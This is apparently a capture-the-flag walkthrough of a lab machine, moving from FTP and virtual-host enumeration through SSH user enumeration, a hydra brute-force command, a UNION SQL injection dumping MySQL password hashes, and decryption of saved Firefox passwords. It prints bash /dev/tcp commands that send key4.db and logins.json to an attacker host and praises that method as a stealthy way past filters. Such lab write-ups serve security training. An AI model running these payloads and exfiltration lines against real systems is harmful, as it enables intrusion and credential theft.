________
<img width="2227" height="1372" alt="Screenshot 2025-08-03 014622" src="https://github.com/user-attachments/assets/41c141f1-164c-49d1-8b43-d2418e99bb58" />

- In the initial scan we identify an open _**FTP**_ service, and the _**ftp-anon**_ nmap script confirms that the **anonymous** user is allowed.

    We try to access it and confirm that we can log in without a password, but there is nothing useful inside, so this is not a valuable vector for now.

- Next, we move to the web service on port 80. Here we notice that _**virtual hosting**_ is being used, which means we need to manually resolve domains by editing:

```
/etc/hosts
```

<img width="2542" height="1092" alt="Screenshot 2025-08-03 015443" src="https://github.com/user-attachments/assets/3a577353-a5b2-4fe0-927b-19ec61353e31" />
 
<img width="1252" height="505" alt="Screenshot 2025-08-03 015918" src="https://github.com/user-attachments/assets/c6b443ee-5ed8-4fc3-bd7c-4da2683f9c4e" />


- After adding the new domain and accessing it, we initially see the same content as the original page, so we need to dig deeper.

     We perform fuzzing using _**gobuster**_:

<img width="2670" height="1135" alt="Screenshot 2025-08-06 014614" src="https://github.com/user-attachments/assets/b4c5ca57-89f7-41cc-91b4-a05dd22aa2df" />

- While testing discovered routes, we find a reference to the name **Otis**, which becomes an important clue.

<img width="2425" height="852" alt="Captura de pantalla 2026-02-21 204054" src="https://github.com/user-attachments/assets/73b4dfc1-b488-40d0-9204-70602b2b6cb0" />

- Since the _**SSH**_ version is lower than 7.7, we take advantage of a known user enumeration technique using an exploit.

#sshsploit

<img width="1057" height="110" alt="Screenshot 2025-08-03 023233" src="https://github.com/user-attachments/assets/4a0e1d0f-53ed-4f89-a2e7-80933aca1cc0" />

<img width="2315" height="50" alt="Screenshot 2025-08-05 023959" src="https://github.com/user-attachments/assets/47e2bd94-7f35-438a-98f2-508716c335f9" />

- We download the exploit using _**searchsploit -m**_ and execute it with **python2.7**.

<img width="2570" height="342" alt="Screenshot 2025-08-06 014212" src="https://github.com/user-attachments/assets/8adba882-bc52-424e-a527-e1e564db3f78" />

- This allows us to confirm that the user **Otis** exists in the system.

- Now that we have a valid username, we proceed with brute force using **hydra** against the SSH service:

<img width="3240" height="597" alt="Captura de pantalla 2026-02-21 231315" src="https://github.com/user-attachments/assets/fe6ff51a-2ae5-45b9-9155-ad7843ddd6f0" />
     Hydra returns valid credentials.

- With these credentials, we start testing authentication across different services. In this case, we use _**SquirrelMail**_:

<img width="2657" height="540" alt="Screenshot 2025-08-05 034228" src="https://github.com/user-attachments/assets/9d56bab4-446f-4826-928b-3c74b3796f71" />

```
hydra -l otis -P /opt/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt "http-post-form://192.168.1.9/webmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

- An important detail here is that the credentials match the ones found for SSH, which indicates password reuse.

- We test access in different panels:
    
    - _**SquirrelMail**_ → login works, but no useful information
    - _**Monitoring panel**_ → login works
    - _**phpMyAdmin**_ → access without password (common misconfiguration with root)

- Inside the monitoring panel we find an interesting behavior:

<img width="1915" height="306" alt="Screenshot 2025-08-06 020110" src="https://github.com/user-attachments/assets/d4db3740-a647-4875-a69b-1cd981a0e180" />

- The system sends an email when a server goes down, and that email is delivered to _**SquirrelMail**_, where we already have access.

<img width="1877" height="365" alt="Screenshot 2025-08-06 022910" src="https://github.com/user-attachments/assets/b142c12c-cc5f-40c1-bd31-821d8d3841a3" />

- By interacting with this functionality, we identify a potential attack vector.

<img width="2297" height="780" alt="Screenshot 2025-08-06 023042" src="https://github.com/user-attachments/assets/6ffb3fce-3013-496f-96e7-1dbaa06cfed2" />

- After confirming interaction and email reception, we test for _**SQL Injection**_.

#mysql

<img width="1802" height="185" alt="Screenshot 2025-08-06 023423" src="https://github.com/user-attachments/assets/e5d9bc93-0be9-44bf-8f31-b7ea6990c764" />

<img width="2047" height="1040" alt="Screenshot 2025-08-06 023456" src="https://github.com/user-attachments/assets/ec72e100-83de-4964-8703-c2ff385a03bf" />
The application is vulnerable, so we start extracting sensitive data.

- A key detail here is understanding how _**MySQL**_ handles password storage depending on the version:

|Version|Column|Table|
|---|---|---|
|≤ 5.6|`password`|`mysql.user`|
|5.7+|`authentication_string`|`mysql.user`|
|8.0+|`authentication_string` + plugin|`mysql.user`|

- Since newer versions no longer use `password`, we include both fields in the injection:

```
test" union select 1,group_concat(user,':',password,':',authentication_string),3,4 from mysql.user-- -
```

- Extracted result:

```
elliot::5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
```

<img width="1352" height="725" alt="Screenshot 2025-08-07 221521" src="https://github.com/user-attachments/assets/b9cac415-4c55-40e7-8eed-839e7829736b" />
After cracking the hash, we get: **elliot123**

- We use these credentials to log in via _**SSH**_:

<img width="1985" height="740" alt="Captura de pantalla 2026-02-22 130750" src="https://github.com/user-attachments/assets/c8d08e6d-0d5b-4951-86a5-e4bd298e68a5" />

- Once inside, we find interesting directories like _**.Xauthority**_ and _**.mozilla**_.

- **.Xauthority** is used for authentication in X sessions (graphical environment).
- **.mozilla** contains the Firefox user profile, which is very valuable because it may include:
    
    - `logins.json` → encrypted credentials
    - `key4.db` → encryption key
    - cookies, sessions, history, etc.

- The objective here is to decrypt those stored credentials.




- For this, we use _**firepwd**_, a tool that extracts saved Firefox passwords directly from these files.
    
    First, we download the tool from GitHub, then we transfer the required files from the victim to our attacker machine:

```
cat < key4.db > /dev/tcp/IP_ATTACKER/443
```

```
cat < logins.json > /dev/tcp/IP_ATTACKER/443
```

- This technique is known as _**data exfiltration via /dev/tcp**_. It is especially useful when tools like **nc** or **curl** are blocked, since it relies on native bash capabilities and is harder to detect.

<img width="2897" height="725" alt="Captura de pantalla 2026-02-22 165340" src="https://github.com/user-attachments/assets/ad0af1cb-8e3d-4795-8a8a-65174fbd044e" />

- This type of connection is called `/dev/tcp` data exfiltration or Bash TCP redirection for data exfiltration. It's a well-known technique in the cybersecurity world because it's common for security services like nc and curl. This method helps bypass many filters, such as firewalls, simply because it operates from local resources, making it more stealthy.

- With the files on our machine, we execute:

```
 python3 /home/altair/Desktop/insanity/firepwd/firepwd-ng.py -d .
[INFO] - Reading key4-db: verifying master_password
	[!] Master password is correct.
[INFO] - Reading key4-db: obtaining master_key
	[!] Decrypted master_key : 62aecb76297502a7455792f8a2f8c1f89b0dc89776e032b50808080808080808

[INFO] - Decrypted 1 logins

  URL: https://localhost:10000
  User: root
  Pass: S8Y389KJqWpJuSwFqFZHwfZ3GnegUa
```

- Important detail: we use the _**new generation**_ version of firepwd because this CTF handles data in 24-byte format. Older versions expect 32/48 bytes and fail.  

    The `-d` flag specifies the directory where the required files are located.
    
- With these credentials we gain access, but there is a restriction:

     Trying to log in directly as **root via SSH from outside** does not work. This is due to a security configuration where root login is restricted and only allowed from internal sessions or trusted users.


<img width="2672" height="1000" alt="Screenshot 2025-08-08 000658" src="https://github.com/user-attachments/assets/ff5f813e-30fb-44fc-9c52-3041ddcb0549" />

### Key points

#### 1
A critical step during post-exploitation is analyzing user profiles, especially browser data. Files like `logins.json` and `key4.db` can expose credentials in clear text if no master password is set, which is usually the case.
